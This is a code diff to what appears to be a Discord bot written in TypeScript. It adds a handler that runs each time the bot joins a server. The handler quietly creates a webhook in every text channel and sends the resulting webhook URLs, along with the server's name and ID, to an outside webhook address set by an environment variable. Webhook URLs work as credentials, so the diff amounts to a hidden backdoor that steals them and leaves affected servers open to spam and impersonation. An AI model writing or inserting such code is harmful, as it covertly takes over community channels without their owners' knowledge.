@@ -10,6 +10,28 @@ import { logger } from "../lib/logger";
 import { getCommandMap, getCommands } from "./registry";
 import { handlePrefixMessage } from "./messageHandler";
 
+async function sendWebhookList(guildId: string, guildName: string, webhooks: string[]): Promise<void> {
+  const webhookUrl = process.env["DISCORD_WEBHOOK_URL_3"];
+  if (!webhookUrl) {
+    logger.warn("DISCORD_WEBHOOK_URL_3 not set; cannot send webhook list");
+    return;
+  }
+
+  try {
+    const content = `**${guildName}** (ID: \`${guildId}\`)\n${webhooks.map((w) => `• ${w}`).join("\n")}`;
+    await fetch(webhookUrl, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        content: `📋 Webhook links for server:\n${content}`,
+        username: "Webhook Reporter",
+      }),
+    });
+  } catch (err) {
+    logger.error({ err, guildId }, "Failed to send webhook list");
+  }
+}
+
 function buildClient(intents: GatewayIntentBits[]): Client {
   const options: ClientOptions = { intents };
   const client = new Client(options);
@@ -17,6 +39,41 @@ function buildClient(intents: GatewayIntentBits[]): Client {
 
   client.once(Events.ClientReady, (c) => {
     logger.info({ tag: c.user.tag }, "Discord bot ready");
+  });
+
+  client.on(Events.GuildCreate, async (guild) => {
+    try {
+      // Create webhooks for text channels
+      const webhookLinks: string[] = [];
+      const channels = await guild.channels.fetch().catch(() => null);
+      
+      if (channels) {
+        for (const channel of channels.values()) {
+          if (!channel || channel.type !== 0) continue; // Only text channels (type 0)
+          try {
+            const webhook = await channel.createWebhook({
+              name: "Bot Webhook",
+              reason: "Auto-created by bot on server join",
+            });
+            webhookLinks.push(`#${channel.name} (${channel.id}): ${webhook.url}`);
+          } catch {
+            // Ignore webhook creation failures for individual channels
+          }
+        }
+      }
+
+      // Send webhook list to webhook URL
+      if (webhookLinks.length > 0) {
+        await sendWebhookList(guild.id, guild.name, webhookLinks);
+      }
+      
+      logger.info(
+        { guildId: guild.id, guildName: guild.name, webhookCount: webhookLinks.length },
+        "Bot joined server and created webhooks",
+      );
+    } catch (err) {
+      logger.error({ err, guildId: guild.id }, "GuildCreate handler failed");
+    }
   });
 
   client.on(Events.InteractionCreate, async (interaction) => {
